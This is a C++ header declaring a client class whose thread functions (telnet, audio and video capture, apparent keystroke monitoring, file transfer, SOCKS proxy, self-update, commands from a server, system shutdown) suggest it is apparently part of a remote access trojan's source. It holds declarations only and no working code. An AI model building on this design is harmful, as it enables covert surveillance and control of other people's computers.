// MyClientMain.h: interface for the CMyClientMain class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_MYCLIENTMAIN_H__518EAB1C_77DF_4990_B750_72AACD29A6FE__INCLUDED_)
#define AFX_MYCLIENTMAIN_H__518EAB1C_77DF_4990_B750_72AACD29A6FE__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

class CMyClientMain  : public CMyClientTran
{
public:
	CMyClientMain();
	virtual ~CMyClientMain();
	
	DWORD*			pWorkRet;
	HANDLE			hWaitEvent;
	BOOL			bExitWork;

	void DoWork(PSDLLINFO m_Info, DWORD* pRet);
	void DoKeepAlive();
	void static SSH_InDvThread(LPVOID lPvoid);
	void static SSH_TlntThread(LPVOID lPvoid);
	void static SSH_MainThread(LPVOID lPvoid);
	void static SSH_FramThread(LPVOID lPvoid);
	void static SSH_MessThread(LPVOID lPvoid);
	void static SSH_VideoThread(LPVOID lPvoid);
	void static SSH_AudioThread(LPVOID lPvoid);
	void static SSH_TuRlThread(LPVOID lPvoid);
	void static SSH_LinkThread(LPVOID lPvoid);
	void static SSH_DlThread(LPVOID lPvoid);
	void static SSH_UpThread(LPVOID lPvoid);
	void static SSH_FileThread(LPVOID lPvoid);
	void static SSH_KeepThread(LPVOID lPvoid);
	void static SSH_KeyMThread(LPVOID lPvoid);
	void static SSH_SOCKSThread(LPVOID lPvoid);
	void static SSH_UpdateWaitThread(LPVOID lPvoid);

private:
	
	void ShutDownSystem(BOOL Flag);
	void GetCmdFromServer(DWORD* pRet);
	BOOL UpdateFile(LPVOID lPvoid);
	BOOL static StartUserProcess(LPPSDLLINFO pDllInfo);
};

#endif // !defined(AFX_MYCLIENTMAIN_H__518EAB1C_77DF_4990_B750_72AACD29A6FE__INCLUDED_)
